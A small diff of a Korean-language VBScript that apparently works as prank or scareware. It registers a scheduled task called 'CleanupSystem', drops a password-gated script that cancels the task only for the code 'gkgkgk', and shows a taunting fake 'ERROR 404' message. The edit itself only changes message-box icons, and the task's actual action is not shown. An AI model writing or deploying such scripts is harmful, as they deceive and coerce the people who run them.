@@ -46,7 +46,7 @@ If InStr(osVersion, "Windows 7") > 0 Then
     objPasswordFile.WriteLine "If userInput = ""gkgkgk"" Then"
     objPasswordFile.WriteLine "    Set shell = CreateObject(""WScript.Shell"")"
     objPasswordFile.WriteLine "    shell.Run ""schtasks /delete /tn CleanupSystem /f"", 0, True"
-    objPasswordFile.WriteLine "    MsgBox ""작업이 취소되었습니다."", 64, ""작업 취소"""
+    objPasswordFile.WriteLine "    MsgBox ""작업이 취소되었습니다."", 48, ""작업 취소"""
     objPasswordFile.WriteLine "Else"
     objPasswordFile.WriteLine "    MsgBox ""비밀번호가 올바르지 않습니다."", 48, ""오류"""
     objPasswordFile.WriteLine "End If"
@@ -56,7 +56,7 @@ If InStr(osVersion, "Windows 7") > 0 Then
     shell.Run "wscript """ & passwordScript & """", 1, False
     
     ' "고맙다"고 메시지 출력
-    MsgBox "나를 해방 시켜줘서 고마워.. 헤헤헤ㅔ헤헿헤", 64, "ERROR 404"
+    MsgBox "나를 해방 시켜줘서 고마워.. 헤헤헤ㅔ헤헿헤", 48, "ERROR 404"
     
     ' 1일(86400초) 뒤에 스크립트를 삭제하는 스케줄러 작업 등록
     deleteScript = shell.ExpandEnvironmentStrings("%TEMP%\delete_scripts.vbs")
